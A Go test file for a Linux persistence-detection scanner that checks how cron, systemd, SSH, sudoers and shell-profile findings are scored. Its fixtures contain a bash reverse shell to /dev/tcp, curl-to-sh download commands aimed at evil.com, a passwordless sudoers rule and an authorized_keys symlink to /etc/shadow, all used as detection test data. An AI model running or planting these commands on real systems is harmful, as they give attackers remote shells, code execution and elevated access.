package persistence_test

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"aether/internal/config"
	"aether/internal/events"
	"aether/internal/modules/persistence"
	"aether/internal/report"
	"aether/internal/triage"
)

// TestRealWorldStockFixtures_ZeroAlertsWarnings verifies that a realistic stock
// Ubuntu/Debian developer box produces ZERO WARNINGs and ZERO ALERTs.
func TestRealWorldStockFixtures_ZeroAlertsWarnings(t *testing.T) {
	stockRoot, err := filepath.Abs("../../../testdata/stock")
	if err != nil {
		t.Fatalf("failed to get absolute path to testdata/stock: %v", err)
	}

	mod := persistence.NewModuleWithRoot(stockRoot, nil, nil, nil)
	rep := &memoryReporter{}
	cfg := config.NewDefaultConfig()

	err = mod.Run(context.Background(), cfg, rep)
	if err != nil {
		t.Fatalf("persistence run failed on stock fixtures: %v", err)
	}

	for _, f := range rep.Findings() {
		if f.Severity == report.SeverityAlert || f.Severity == report.SeverityWarning {
			t.Errorf("Stock fixture produced unexpected %s: %s (rule: %s, path: %s)",
				f.Severity, f.Reason, f.RuleName, f.Path)
		}
	}
}

// TestRealWorldMalicious_WaitForIt_DoesNotAlert verifies that a bare /dev/tcp reference
// in a wait-for-it style script produces at most WARNING, NEVER ALERT.
func TestRealWorldMalicious_WaitForIt_DoesNotAlert(t *testing.T) {
	maliciousRoot, err := filepath.Abs("../../../testdata/malicious")
	if err != nil {
		t.Fatalf("failed to get absolute path to testdata/malicious: %v", err)
	}

	cov := &persistence.CheckCoverage{}
	cfg := config.NewDefaultConfig()

	findings, err := persistence.CheckCron(context.Background(), maliciousRoot, cfg, nil, nil, cov)
	if err != nil {
		t.Fatalf("CheckCron failed: %v", err)
	}

	var waitForItFinding *report.Finding
	for _, f := range findings {
		if strings.Contains(f.Path, "wait-for-it") {
			waitForItFinding = &f
			break
		}
	}

	if waitForItFinding == nil {
		t.Fatalf("expected finding for wait-for-it script, got none")
	}

	if waitForItFinding.Severity == report.SeverityAlert {
		t.Errorf("bare /dev/tcp in wait-for-it script MUST NOT alert alone, got: %s (rule: %s)",
			waitForItFinding.Severity, waitForItFinding.RuleName)
	}
	if waitForItFinding.Severity != report.SeverityWarning {
		t.Errorf("expected WARNING for /dev/tcp socket reference, got: %s", waitForItFinding.Severity)
	}
}

// TestRealWorldMalicious_InteractiveRevShell_Alerts verifies that interactive shell
// redirection to a socket triggers an immediate ALERT as a high-confidence primitive.
func TestRealWorldMalicious_InteractiveRevShell_Alerts(t *testing.T) {
	maliciousRoot, err := filepath.Abs("../../../testdata/malicious")
	if err != nil {
		t.Fatalf("failed to get absolute path to testdata/malicious: %v", err)
	}

	cov := &persistence.CheckCoverage{}
	cfg := config.NewDefaultConfig()

	findings, err := persistence.CheckCron(context.Background(), maliciousRoot, cfg, nil, nil, cov)
	if err != nil {
		t.Fatalf("CheckCron failed: %v", err)
	}

	var revFinding *report.Finding
	for _, f := range findings {
		if strings.Contains(f.Path, "revshell") {
			revFinding = &f
			break
		}
	}

	if revFinding == nil {
		t.Fatalf("expected finding for revshell cron, got none")
	}

	if revFinding.Severity != report.SeverityAlert {
		t.Errorf("interactive reverse shell MUST trigger ALERT, got: %s", revFinding.Severity)
	}
	if hc, ok := revFinding.Metadata["high_confidence"].(bool); !ok || !hc {
		t.Errorf("expected high_confidence metadata = true on reverse shell primitive")
	}
}

// TestRealWorldMalicious_SSHAuthorizedKeysShadowSymlink_Alerts verifies that a user
// authorized_keys symlink pointing to /etc/shadow triggers ALERT without reading target content.
func TestRealWorldMalicious_SSHAuthorizedKeysShadowSymlink_Alerts(t *testing.T) {
	maliciousRoot, err := filepath.Abs("../../../testdata/malicious")
	if err != nil {
		t.Fatalf("failed to get absolute path to testdata/malicious: %v", err)
	}

	cov := &persistence.CheckCoverage{}
	cfg := config.NewDefaultConfig()

	findings, err := persistence.CheckSSH(context.Background(), maliciousRoot, cfg, nil, nil, cov)
	if err != nil {
		t.Fatalf("CheckSSH failed: %v", err)
	}

	var sshFinding *report.Finding
	for _, f := range findings {
		if strings.Contains(f.Path, "authorized_keys") {
			sshFinding = &f
			break
		}
	}

	if sshFinding == nil {
		t.Fatalf("expected finding for malicious authorized_keys symlink, got none")
	}

	if sshFinding.Severity != report.SeverityAlert {
		t.Errorf("expected ALERT for authorized_keys pointing to /etc/shadow, got: %s", sshFinding.Severity)
	}

	// Verify target contents are not leaked or quoted
	if strings.Contains(sshFinding.Reason, "root:") {
		t.Errorf("forbidden: /etc/shadow contents were read or leaked into finding reason")
	}
}

// TestSignalStrength_WeakNeverCorroboratesAlert tests the core accuracy rule:
// weak signals never count as corroboration for an ALERT.
func TestSignalStrength_WeakNeverCorroboratesAlert(t *testing.T) {
	// Case A: 3 distinct weak signal classes -> capped at WARNING, totalScore <= 70
	weakSignals := []*persistence.PersistenceSignal{
		{
			Class:    persistence.ClassExecFromTemp,
			RuleName: "Persistence_Exec_From_Home_Hidden_Path",
			Reason:   "Hidden home tool",
			Score:    25,
			Severity: report.SeverityNotice,
			IsStrong: false,
		},
		{
			Class:    persistence.ClassMissingTarget,
			RuleName: "Persistence_Missing_Target_File",
			Reason:   "Missing binary",
			Score:    25,
			Severity: report.SeverityNotice,
			IsStrong: false,
		},
		{
			Class:    persistence.ClassUnowned,
			RuleName: "Persistence_Systemd_Unowned_Unit",
			Reason:   "Unowned unit",
			Score:    30,
			Severity: report.SeverityNotice,
			IsStrong: false,
		},
	}

	fA := persistence.ConsolidateSignals(weakSignals, "/home/user/.bashrc", nil)
	if fA == nil {
		t.Fatal("expected consolidated finding for Case A")
	}
	if fA.Severity == report.SeverityAlert {
		t.Errorf("weak signals alone must NEVER trigger ALERT, got %s", fA.Severity)
	}
	if fA.Severity != report.SeverityWarning {
		t.Errorf("expected WARNING for multiple weak signals, got %s", fA.Severity)
	}
	scoreA := fA.Metadata["score"].(int)
	if scoreA > 70 {
		t.Errorf("weak signals only score must be capped at 70, got %d", scoreA)
	}

	// Case B: 1 Strong + 1 Weak -> WARNING (raised score, capped < 85)
	strongPlusWeak := []*persistence.PersistenceSignal{
		{
			Class:    persistence.ClassDownloadAndExecute,
			RuleName: "Persistence_Download_And_Execute",
			Reason:   "curl | bash",
			Score:    75,
			Severity: report.SeverityWarning,
			IsStrong: true,
		},
		{
			Class:    persistence.ClassMissingTarget,
			RuleName: "Persistence_Missing_Target_File",
			Reason:   "Missing binary",
			Score:    25,
			Severity: report.SeverityNotice,
			IsStrong: false,
		},
	}

	fB := persistence.ConsolidateSignals(strongPlusWeak, "/home/user/.profile", nil)
	if fB == nil {
		t.Fatal("expected consolidated finding for Case B")
	}
	if fB.Severity == report.SeverityAlert {
		t.Errorf("strong + weak must NOT trigger ALERT, got %s", fB.Severity)
	}
	if fB.Severity != report.SeverityWarning {
		t.Errorf("expected WARNING for strong + weak, got %s", fB.Severity)
	}
	scoreB := fB.Metadata["score"].(int)
	if scoreB > 80 {
		t.Errorf("strong + weak score must be capped below ALERT (< 85), got %d", scoreB)
	}

	// Case C: 2 Strong distinct classes -> ALERT (score >= 85)
	strongPlusStrong := []*persistence.PersistenceSignal{
		{
			Class:    persistence.ClassDownloadAndExecute,
			RuleName: "Persistence_Download_And_Execute",
			Reason:   "curl | bash",
			Score:    75,
			Severity: report.SeverityWarning,
			IsStrong: true,
		},
		{
			Class:    persistence.ClassExecFromTemp,
			RuleName: "Persistence_Exec_From_Temp",
			Reason:   "Exec from /tmp",
			Score:    70,
			Severity: report.SeverityWarning,
			IsStrong: true,
		},
	}

	fC := persistence.ConsolidateSignals(strongPlusStrong, "/etc/cron.d/evil", nil)
	if fC == nil {
		t.Fatal("expected consolidated finding for Case C")
	}
	if fC.Severity != report.SeverityAlert {
		t.Errorf("strong + strong MUST trigger ALERT, got %s", fC.Severity)
	}
	if hc, ok := fC.Metadata["high_confidence"].(bool); !ok || !hc {
		t.Errorf("expected high_confidence = true for strong + strong")
	}
}

// TestVerdictEngine_CompromisedRequiresHighConfidence tests verdict computation:
// COMPROMISED requires at least one high-confidence indicator. Otherwise capped at SUSPICIOUS.
func TestVerdictEngine_CompromisedRequiresHighConfidence(t *testing.T) {
	// Case 1: 14 warnings, 0 alerts -> SUSPICIOUS
	v, reason := events.ComputeVerdict(nil, 0, 14, 2, 0)
	if v != events.VerdictSuspicious {
		t.Errorf("expected SUSPICIOUS, got %s", v)
	}
	if !strings.Contains(reason, "SUSPICIOUS: 14 warnings, no high-confidence indicators") {
		t.Errorf("unexpected verdict reason: %s", reason)
	}

	// Case 2: ALERT without high confidence -> capped at SUSPICIOUS
	weakAlert := report.NewFinding("test", report.SeverityAlert, "/path", "weak alert", "Weak_Alert")
	v2, reason2 := events.ComputeVerdict([]report.Finding{weakAlert}, 1, 5, 0, 0)
	if v2 != events.VerdictSuspicious {
		t.Errorf("expected SUSPICIOUS for alert without high confidence, got %s", v2)
	}
	if !strings.Contains(reason2, "SUSPICIOUS: 1 alerts, no high-confidence indicators") {
		t.Errorf("unexpected verdict reason: %s", reason2)
	}

	// Case 3: High-confidence ALERT -> COMPROMISED
	hcFinding := report.NewFinding("persistence", report.SeverityAlert, "/path", "interactive revshell", "Persistence_Reverse_Shell_Primitive")
	hcFinding.Metadata["high_confidence"] = true
	v3, reason3 := events.ComputeVerdict([]report.Finding{hcFinding}, 1, 5, 0, 0)
	if v3 != events.VerdictCompromised {
		t.Errorf("expected COMPROMISED, got %s", v3)
	}
	if !strings.Contains(reason3, "COMPROMISED: high-confidence threat indicator detected") {
		t.Errorf("unexpected verdict reason: %s", reason3)
	}

	// Case 4: 10 notices, 0 alerts, 0 warnings -> CLEAN with review note
	v4, reason4 := events.ComputeVerdict(nil, 0, 0, 10, 0)
	if v4 != events.VerdictClean {
		t.Errorf("expected CLEAN for notices alone, got %s", v4)
	}
	if reason4 != "CLEAN, 10 notices to review" {
		t.Errorf("expected 'CLEAN, 10 notices to review', got '%s'", reason4)
	}
}

// TestRealWorldStock_Zshrc verifies that a stock /etc/zsh/zshrc produces 0 findings.
func TestRealWorldStock_Zshrc(t *testing.T) {
	root := t.TempDir()
	zshDir := filepath.Join(root, "etc/zsh")
	if err := os.MkdirAll(zshDir, 0755); err != nil {
		t.Fatal(err)
	}
	stockZshrc := `# /etc/zsh/zshrc: system-wide .zshrc file for zsh(1).
READNULLCMD=${PAGER:-/usr/bin/pager}
typeset -ga debian_missing_features
zstyle ':completion:*:sudo:*' command-path /usr/local/sbin \
                                           /usr/local/bin  \
                                           /usr/sbin       \
                                           /usr/bin        \
                                           /sbin           \
                                           /bin            \
                                           /usr/X11R6/bin
(( ${+aliases[run-help]} )) && unalias run-help
autoload -Uz run-help
`
	if err := os.WriteFile(filepath.Join(zshDir, "zshrc"), []byte(stockZshrc), 0644); err != nil {
		t.Fatal(err)
	}

	cfg := config.NewDefaultConfig()
	cov := &persistence.CheckCoverage{}
	findings, err := persistence.CheckProfiles(context.Background(), root, cfg, nil, nil, cov)
	if err != nil {
		t.Fatalf("CheckShellProfiles failed: %v", err)
	}
	if len(findings) != 0 {
		t.Fatalf("expected 0 findings for stock /etc/zsh/zshrc, got %d: %+v", len(findings), findings)
	}
}

// TestRealWorld_SourceHiddenDir verifies that sourcing from a well-known dotdir
// like ~/.config/x produces 0 findings.
func TestRealWorld_SourceHiddenDir(t *testing.T) {
	root := t.TempDir()
	homeDir := filepath.Join(root, "home/alice")
	cfgDir := filepath.Join(homeDir, ".config")
	if err := os.MkdirAll(cfgDir, 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(cfgDir, "env.sh"), []byte("export FOO=bar\n"), 0644); err != nil {
		t.Fatal(err)
	}
	bashrcContent := "source ~/.config/env.sh\n"
	if err := os.WriteFile(filepath.Join(homeDir, ".bashrc"), []byte(bashrcContent), 0644); err != nil {
		t.Fatal(err)
	}

	cfg := config.NewDefaultConfig()
	cov := &persistence.CheckCoverage{}
	findings, err := persistence.CheckProfiles(context.Background(), root, cfg, nil, nil, cov)
	if err != nil {
		t.Fatalf("CheckShellProfiles failed: %v", err)
	}
	for _, f := range findings {
		if strings.Contains(f.RuleName, "Hidden_Path") {
			t.Errorf("expected no hidden path finding for well-known .config dir, got %s: %s", f.RuleName, f.Reason)
		}
	}
	if len(findings) != 0 {
		t.Fatalf("expected 0 findings for sourcing ~/.config/env.sh, got %d: %+v", len(findings), findings)
	}
}

// TestRealWorld_SSHHiddenKey verifies that an option argument specifying an SSH key (-i ~/.ssh/...)
// is not parsed as an exec target and does not trigger hidden path execution.
func TestRealWorld_SSHHiddenKey(t *testing.T) {
	root := t.TempDir()
	unitDir := filepath.Join(root, "etc/systemd/system")
	if err := os.MkdirAll(unitDir, 0755); err != nil {
		t.Fatal(err)
	}
	unitContent := `[Unit]
Description=SSH Worker
[Service]
ExecStart=/usr/bin/ssh -i /home/alice/.ssh/id_rsa -o StrictHostKeyChecking=accept-new user@example.com
`
	if err := os.WriteFile(filepath.Join(unitDir, "ssh-worker.service"), []byte(unitContent), 0644); err != nil {
		t.Fatal(err)
	}

	cfg := config.NewDefaultConfig()
	cov := &persistence.CheckCoverage{}
	findings, err := persistence.CheckSystemd(context.Background(), root, cfg, nil, nil, cov)
	if err != nil {
		t.Fatalf("CheckSystemd failed: %v", err)
	}
	for _, f := range findings {
		if strings.Contains(f.RuleName, "Hidden_Path") {
			t.Errorf("ssh -i argument must NOT be flagged as hidden path exec target, got: %s (reason: %s)", f.RuleName, f.Reason)
		}
	}
}

// TestRealWorld_WantsUnitPair_Deduplication verifies that a wants-symlink and its target unit
// produce exactly 1 finding with wants_symlink attached to metadata.
func TestRealWorld_WantsUnitPair_Deduplication(t *testing.T) {
	root := t.TempDir()
	unitDir := filepath.Join(root, "etc/systemd/system")
	wantsDir := filepath.Join(root, "etc/systemd/system/multi-user.target.wants")
	if err := os.MkdirAll(wantsDir, 0755); err != nil {
		t.Fatal(err)
	}

	targetUnitPath := filepath.Join(unitDir, "custom-daemon.service")
	unitContent := `[Unit]
Description=Custom Daemon
[Service]
ExecStart=/usr/local/bin/custom-daemon
`
	if err := os.WriteFile(targetUnitPath, []byte(unitContent), 0644); err != nil {
		t.Fatal(err)
	}

	symlinkPath := filepath.Join(wantsDir, "custom-daemon.service")
	if err := os.Symlink("/etc/systemd/system/custom-daemon.service", symlinkPath); err != nil {
		t.Fatal(err)
	}

	cfg := config.NewDefaultConfig()
	cov := &persistence.CheckCoverage{}
	findings, err := persistence.CheckSystemd(context.Background(), root, cfg, nil, nil, cov)
	if err != nil {
		t.Fatalf("CheckSystemd failed: %v", err)
	}

	daemonFindings := 0
	var foundFinding *report.Finding
	for _, f := range findings {
		if strings.Contains(f.Path, "custom-daemon.service") {
			daemonFindings++
			foundFinding = &f
		}
	}

	if daemonFindings != 1 {
		t.Fatalf("expected exactly 1 finding for wants-symlink and unit pair, got %d", daemonFindings)
	}
	if foundFinding == nil {
		t.Fatal("expected finding for custom-daemon.service, got nil")
	}
	wantsSymlink, ok := foundFinding.Metadata["wants_symlink"].(string)
	if !ok || wantsSymlink != "/etc/systemd/system/multi-user.target.wants/custom-daemon.service" {
		t.Errorf("expected Metadata[wants_symlink] to record symlink path, got: %v", wantsSymlink)
	}
}

// TestRealWorld_DesktopTermiMind_NoticeOnly verifies that a desktop entry executing a tool
// in a non-well-known dotdir produces NOTICE (25), not WARNING.
func TestRealWorld_DesktopTermiMind_NoticeOnly(t *testing.T) {
	root := t.TempDir()
	homeDir := filepath.Join(root, "home/alice")
	autostartDir := filepath.Join(homeDir, ".config/autostart")
	termiDir := filepath.Join(homeDir, ".termi_mind")
	if err := os.MkdirAll(autostartDir, 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(termiDir, 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(termiDir, "agent.py"), []byte("print('running')\n"), 0755); err != nil {
		t.Fatal(err)
	}
	_ = os.MkdirAll(filepath.Join(root, "etc"), 0755)
	_ = os.WriteFile(filepath.Join(root, "etc/passwd"), []byte("alice:x:1000:1000::/home/alice:/bin/bash\n"), 0644)

	desktopContent := `[Desktop Entry]
Type=Application
Name=TermiMind
Exec=bash -c "nohup python3 ~/.termi_mind/agent.py &"
`
	if err := os.WriteFile(filepath.Join(autostartDir, "termi.desktop"), []byte(desktopContent), 0644); err != nil {
		t.Fatal(err)
	}

	cfg := config.NewDefaultConfig()
	cov := &persistence.CheckCoverage{}
	findings, err := persistence.CheckOtherHooks(context.Background(), root, cfg, nil, nil, cov)
	if err != nil {
		t.Fatalf("CheckHooks failed: %v", err)
	}

	var termiFinding *report.Finding
	for _, f := range findings {
		if strings.Contains(f.Path, "termi.desktop") {
			termiFinding = &f
			break
		}
	}

	if termiFinding == nil {
		t.Fatalf("expected finding for termi.desktop, got none")
	}
	if termiFinding.Severity != report.SeverityNotice {
		t.Errorf("expected NOTICE for user autostart with non-wellknown dotdir, got %s (reason: %s)",
			termiFinding.Severity, termiFinding.Reason)
	}
	score, ok := termiFinding.Metadata["score"].(int)
	if !ok || score != 25 {
		t.Errorf("expected score 25, got %v", score)
	}
}

// TestRealWorld_Wrappers_TempExec verifies that wrapper commands (env, nohup, bash -c)
// executing from /tmp all flag Persistence_Exec_From_Temp.
func TestRealWorld_Wrappers_TempExec(t *testing.T) {
	cfg := config.NewDefaultConfig()

	testCases := []struct {
		name string
		cmd  string
	}{
		{name: "env wrapper", cmd: "env X=1 /tmp/x"},
		{name: "nohup wrapper", cmd: "nohup /tmp/x &"},
		{name: "bash -c wrapper", cmd: "bash -c '/tmp/x'"},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			signals := persistence.CheckSuspiciousCommand(tc.cmd, 1, cfg, "", false, nil)
			hasTempExec := false
			for _, s := range signals {
				if s.RuleName == "Persistence_Exec_From_Temp" {
					hasTempExec = true
					if !s.IsStrong {
						t.Errorf("expected IsStrong=true for temp execution")
					}
					break
				}
			}
			if !hasTempExec {
				t.Fatalf("expected Persistence_Exec_From_Temp signal for cmd %q, got: %+v", tc.cmd, signals)
			}
		})
	}
}

// TestRealWorld_DownloadAndExecute verifies that piping curl to sh flags Persistence_Download_And_Execute.
func TestRealWorld_DownloadAndExecute(t *testing.T) {
	cfg := config.NewDefaultConfig()
	signals := persistence.CheckSuspiciousCommand("curl -sSL https://evil.com/setup.sh | sh", 1, cfg, "", false, nil)
	hasDlExec := false
	for _, s := range signals {
		if s.RuleName == "Persistence_Download_And_Execute" {
			hasDlExec = true
			if !s.IsStrong {
				t.Errorf("expected IsStrong=true for download and execute")
			}
			break
		}
	}
	if !hasDlExec {
		t.Fatalf("expected Persistence_Download_And_Execute signal, got: %+v", signals)
	}
}

// TestPersistence_BreakdownEqualsEmitted_WithAcknowledged verifies that severity breakdown
// matches emitted findings and counts acknowledged findings downgraded to INFO.
func TestPersistence_BreakdownEqualsEmitted_WithAcknowledged(t *testing.T) {
	root := t.TempDir()
	_ = os.MkdirAll(filepath.Join(root, "etc/cron.d"), 0755)
	_ = os.MkdirAll(filepath.Join(root, "etc/sudoers.d"), 0755)

	// 1. ALERT: reverse shell (not ackable)
	_ = os.WriteFile(filepath.Join(root, "etc/cron.d/rev"), []byte("* * * * * root /bin/bash -i >& /dev/tcp/1.1.1.1/80\n"), 0644)
	// 2. WARNING: !authenticate (will be acknowledged -> downgraded to INFO)
	sudoersPath := filepath.Join(root, "etc/sudoers.d/noauth")
	_ = os.WriteFile(sudoersPath, []byte("ALL ALL=(ALL) !authenticate ALL\n"), 0440)
	sudoersHash, _ := triage.HashFile(sudoersPath, 50*1024*1024)

	// 3. NOTICE: missing target (not acknowledged -> remains NOTICE)
	_ = os.WriteFile(filepath.Join(root, "etc/cron.d/missing"), []byte("* * * * * root /opt/missing_tool/bin/run\n"), 0644)

	_ = os.MkdirAll(filepath.Join(root, "etc/aether"), 0755)
	ackFilePath := filepath.Join(root, "etc/aether/acknowledged.yaml")
	ackContent := fmt.Sprintf(`acknowledgments:
  - path: /etc/sudoers.d/noauth
    file_sha256: %s
    reason: "Dev machine sudoers exception"
`, sudoersHash)
	_ = os.WriteFile(ackFilePath, []byte(ackContent), 0644)

	triEngine, err := triage.LoadEngine(ackFilePath, root)
	if err != nil {
		t.Fatalf("failed to load triage engine: %v", err)
	}

	cfg := config.NewDefaultConfig()
	rep := &memoryReporter{}
	mod := persistence.NewModuleWithRoot(root, nil, nil, nil)
	_ = mod.Run(context.Background(), cfg, rep)

	findings := rep.Findings()
	if len(findings) == 0 {
		t.Fatal("expected findings from module run")
	}

	ackCount := 0
	for i := range findings {
		if triEngine.Evaluate(&findings[i], root) {
			ackCount++
		}
	}
	if ackCount != 1 {
		t.Fatalf("expected exactly 1 finding acknowledged, got %d", ackCount)
	}

	alerts, warnings, notices, infos := 0, 0, 0, 0
	for _, f := range findings {
		switch f.Severity {
		case report.SeverityAlert:
			alerts++
		case report.SeverityWarning:
			warnings++
		case report.SeverityNotice:
			notices++
		case report.SeverityInfo:
			infos++
		}
	}

	total := len(findings)
	if total != alerts+warnings+notices+infos {
		t.Errorf("total (%d) != alerts (%d) + warnings (%d) + notices (%d) + infos (%d)",
			total, alerts, warnings, notices, infos)
	}

	if alerts != 1 {
		t.Errorf("expected 1 ALERT, got %d", alerts)
	}
	if warnings != 0 {
		t.Errorf("expected 0 WARNINGs after ack downgrade, got %d", warnings)
	}
	if notices != 1 {
		t.Errorf("expected 1 NOTICE, got %d", notices)
	}
	if infos != 1 {
		t.Errorf("expected 1 INFO (from acknowledged warning), got %d", infos)
	}
}

func TestGuardedMissingTarget(t *testing.T) {
	cfg := config.NewDefaultConfig()

	// 1. Guarded with [ -x ... ] -> missing target suppressed
	sig1 := persistence.CheckSuspiciousCommand("[ -x /opt/missing/bin ] && /opt/missing/bin", 1, cfg, "", false, nil)
	for _, s := range sig1 {
		if s.RuleName == "Persistence_Missing_Target_File" {
			t.Errorf("guarded target [ -x ... ] must NOT flag Persistence_Missing_Target_File")
		}
	}

	// 2. Guarded with test -x ... -> missing target suppressed
	sig2 := persistence.CheckSuspiciousCommand("test -x /opt/missing/bin && /opt/missing/bin", 2, cfg, "", false, nil)
	for _, s := range sig2 {
		if s.RuleName == "Persistence_Missing_Target_File" {
			t.Errorf("guarded target test -x must NOT flag Persistence_Missing_Target_File")
		}
	}

	// 3. Guarded with command -v ... -> missing target suppressed
	sig3 := persistence.CheckSuspiciousCommand("command -v bin >/dev/null && /opt/missing/bin", 3, cfg, "", false, nil)
	for _, s := range sig3 {
		if s.RuleName == "Persistence_Missing_Target_File" {
			t.Errorf("guarded target command -v must NOT flag Persistence_Missing_Target_File")
		}
	}

	// 4. Guard for DIFFERENT path (test -x /usr/bin/foo && /opt/missing/bin) -> missing target for /opt/missing/bin MUST flag
	sig4 := persistence.CheckSuspiciousCommand("test -x /usr/bin/foo && /opt/missing/bin", 4, cfg, "", false, nil)
	foundMissing := false
	for _, s := range sig4 {
		if s.RuleName == "Persistence_Missing_Target_File" {
			foundMissing = true
			break
		}
	}
	if !foundMissing {
		t.Errorf("guard for different path must NOT suppress missing target for /opt/missing/bin")
	}

	// 5. Guarded line with temp exec (test -x /usr/bin/foo && /tmp/evil) -> still flags Persistence_Exec_From_Temp
	sig5 := persistence.CheckSuspiciousCommand("test -x /usr/bin/foo && /tmp/evil", 5, cfg, "", false, nil)
	foundTemp := false
	for _, s := range sig5 {
		if s.RuleName == "Persistence_Exec_From_Temp" {
			foundTemp = true
			break
		}
	}
	if !foundTemp {
		t.Errorf("guarded line must still flag Persistence_Exec_From_Temp")
	}

	// 6. Guarded line with curl|sh -> still flags Persistence_Download_And_Execute
	sig6 := persistence.CheckSuspiciousCommand("[ -x /usr/bin/curl ] && curl https://evil.com | sh", 6, cfg, "", false, nil)
	foundDownExec := false
	for _, s := range sig6 {
		if s.RuleName == "Persistence_Download_And_Execute" {
			foundDownExec = true
			break
		}
	}
	if !foundDownExec {
		t.Errorf("guarded line must still flag Persistence_Download_And_Execute")
	}

	// 7. Unguarded missing target -> NOTICE
	sig7 := persistence.CheckSuspiciousCommand("/opt/nonexistent_tool_12345/bin/run", 7, cfg, "", false, nil)
	foundUnguarded := false
	for _, s := range sig7 {
		if s.RuleName == "Persistence_Missing_Target_File" {
			foundUnguarded = true
			if s.Severity != report.SeverityNotice {
				t.Errorf("expected NOTICE for missing target, got %s", s.Severity)
			}
			break
		}
	}
	if !foundUnguarded {
		t.Errorf("unguarded missing target must be flagged with Persistence_Missing_Target_File")
	}
}
